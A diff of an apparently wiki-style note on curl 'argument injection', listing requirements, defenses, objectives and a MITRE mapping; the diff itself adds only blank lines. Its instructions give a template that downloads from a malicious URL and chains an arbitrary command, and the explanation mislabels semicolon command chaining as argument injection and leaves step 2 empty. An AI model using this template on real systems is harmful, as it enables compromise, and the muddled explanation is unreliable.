@@ -31,6 +31,8 @@ CURL is a powerful command-line tool for transferring data to or from a server. 
 
 CURL is a powerful command-line tool for transferring data to or from a server. However, it is possible to abuse its command-line arguments to execute arbitrary commands on the victim's machine. This technique is known as argument injection. An attacker can use this technique to execute malicious commands on the victim's machine, which can lead to data theft, system compromise or other malicious activities. The attacker can use various methods to inject malicious arguments, such as manipulating input data or crafting specially-crafted URLs.
 
+ 
+
 ## Requirements
 
 1. Access to the victim's machine
@@ -38,6 +40,8 @@ CURL is a powerful command-line tool for transferring data to or from a server. 
 1. Knowledge of CURL command-line arguments
 
 1. Ability to manipulate input data or craft specially-crafted URLs
+
+ 
 
 ## Defense
 
@@ -47,6 +51,8 @@ CURL is a powerful command-line tool for transferring data to or from a server. 
 
 1. Monitor system logs and network traffic for suspicious activity related to CURL
 
+ 
+
 ## Objectives
 
 1. Execute arbitrary commands on the victim's machine
@@ -55,13 +61,23 @@ CURL is a powerful command-line tool for transferring data to or from a server. 
 
 1. Compromise the victim's system
 
+ 
+
 # Instructions
 
 1. curl <malicious_url> --output <file> ; <malicious_command>
 
+ 
+
+
+
 **Code**: [[curl]]
 
+
+
 > This command downloads a file from a malicious URL and saves it to a file on the victim's machine. It then executes a malicious command using the semicolon (;) operator. The attacker can replace <malicious_url> with a specially-crafted URL that contains malicious arguments. They can also replace <file> with any filename of their choosing, and <malicious_command> with any command they want to execute on the victim's machine.
+
+
 
 **Command** ([[Get Google homepage]]):
 
@@ -69,12 +85,22 @@ CURL is a powerful command-line tool for transferring data to or from a server. 
 curl https://www.google.com/
 ```
 
+
+
 2. 
+
+ 
+
+
 
 **Code**: [[-o, --output <file>
 -O, --remote-name]]
 
+
+
 > 
+
+
 
 **Command** ([[Download file]]):
 
@@ -82,6 +108,8 @@ curl https://www.google.com/
 -o, --output <file>
 -O, --remote-name
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -103,3 +131,5 @@ curl https://www.google.com/
 - [[Argument Injection]]
 - [[CURL]]
 - [[List of exposed commands]]
+
+
